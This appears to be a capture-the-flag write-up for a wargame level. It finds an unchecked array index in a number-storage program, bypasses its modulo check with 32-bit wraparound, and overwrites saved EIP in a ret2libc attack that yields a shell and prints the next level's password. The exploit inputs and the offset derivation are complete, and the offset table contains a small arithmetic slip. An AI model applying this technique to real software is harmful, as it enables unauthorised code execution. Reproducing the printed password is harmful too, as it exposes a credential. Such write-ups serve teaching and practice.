Level07
-------

1) Let's check what functions we have using gdb

 info functions

0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main


2) the bug

The program does : buffer[index] = value;

BUT =>  no bounds check → we can go outside buffer
        bad protection → index % 3 == 0 (can be bypassed)

=> So we can overwrite stack memory

3) Inside gdb 

(gdb) b main
------------
Breakpoint 1 at 0x8048729


(gdb) run
---------
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()



(gdb) p/x $esp+0x24
-------------------
$1 = 0xffffd730


0xffffd730 = This is buffer start

4) How memory looks like

buffer[0]
buffer[1]
...
buffer[100]
...
saved EIP

=> so if we go far we reach EIP 

5)  Find EIP

Instead of guessing we use a big index 1073741938

In c        buffer[index] is just a syntax sugar for *(buffer + index)

Example : 

buffer + 2 means => move 2 elements forward, not 2 bytes. 2 ints (2 × 4 bytes)

*(buffer + 2) means => Go to that address and read/write the value

So : 

Array access: buffer[index] = value

Internally: address = buffer + index * 4

6) EIP distance = (stack size - buffer offset) + pushes + alignment

6.1 Stack size:
---------------

        0x0804872c <+9>: sub $0x1d0,%esp

This means reverse 0x1d0 bytes on the stack
=>>>>> 0x1d0 = 464 bytes

6.2 The Buffer:
---------------

        0x08048791 <+110>: lea 0x24(%esp), %ebx

This means: ebx = esp + 0x24 , And ebx = buffer
=>>>> so buffer start at : buffer esp + 0x24

6.3 Where is saved EIP
---------------------

[ebp]     → old EBP
[ebp + 4] → saved EIP

6.4 Stack layout
----------------


HIGH ADDRESSES
────────────────────
[ebp+4] → saved EIP
[ebp]   → saved EBP
────────────────────
        ↑
        stack grows DOWN
────────────────────
esp → local variables (0x1d0 bytes)
────────────────────
LOW ADDRESSES

6.5 Distance
------------

We know :
buffer = esp + 0x24
EIP    = ebp + 4

ebp = esp + 0x1d0

Because  0x0804872c <+9>: sub $0x1d0,%esp 
Do esp = esp - 0x1d0

ebp = OLD esp (top of frame)
esp = ebp - 0x1d0   (bottom of locals)
so ebp = esp + 0x1d0

6.6 Calculation
---------------

EIP = ebp + 4
    = (esp + 0x1d0) + 4
    = esp + 0x1d4

6.7 Substraction of the buffer
------------------------------

distance = (esp + 0x1d4) - (esp + 0x24)
         = 0x1d4 - 0x24
         = 0x1b0
         = 432 bytes

6.8 Extra pushed registers
--------------------------

   0x08048723 <+0>:	push   %ebp
   0x08048726 <+3>:	push   %edi
   0x08048727 <+4>:	push   %esi
   0x08048728 <+5>:	push   %ebx

4 registers × 4 bytes = 16 bytes

so distance = 432 + 16 = 448

6.9 Alignment padding
---------------------

  0x08048729 <+6>:	and    $0xfffffff0,%esp

aligns stack → adds ~8 bytes

SO distance => EIP = 448 + 8 = 456


Step	                           Value

stack space	                0x1d0 = 464
buffer offset	                0x24 = 36
difference	                464 - 36 = 428
+ saved registers	        +16
+ alignment	                +8
final	                        456 bytes

7) What does “distance = 456 bytes” mean ?

distance(buffer → EIP) = 456 bytes
it literally means:

If we start at the beginning of the buffer and move forward 456 bytes in memory, we arrive at EIP

buffer start
   ↓
[ buffer ]------------------------------[ EIP ]
              ← 456 bytes →

so EIP = buffer + 456

8) Conveting bytes to index

index = 456 / 4 = 114 because each element has 4 bytes 

BUT 114 is blocked because of the condition index % 3 == 0

9) Reaching EIP in different way

We know => buffer[index] = *(buffer + index * 4)

so the address used is => buffer + index * 4

We gonna do a full loop in memory, and we know that in 32-bit systems memory wraps every 2^32
2^32 = 4294967296

so we do 456 + 4294967296 = 4294967752 
so after overflow it will behave like 456

so index * 4 = 4294967752 
       index = 4294967752 / 4
             = 1073741938

so buffer[1073741938] => buffer + 456 => EIP

10) Now let's Overwrite EIP

we know : 

system   = 4159090384
exit     = 4159040368
"/bin/sh"= 4160264172

Step 1 — overwrite EIP
----------------------

store
Number: 4159090384
Index: 1073741938                 => 114 

EIP = system

Step 2 — fake return
--------------------

store
Number: 4159040368
Index: 115

after system → goes to exit

Step 3 — argument
-----------------

store
Number: 4160264172
Index: 116

this becomes argument to system

11) solution

level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ pwd  
/home/users/level07
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
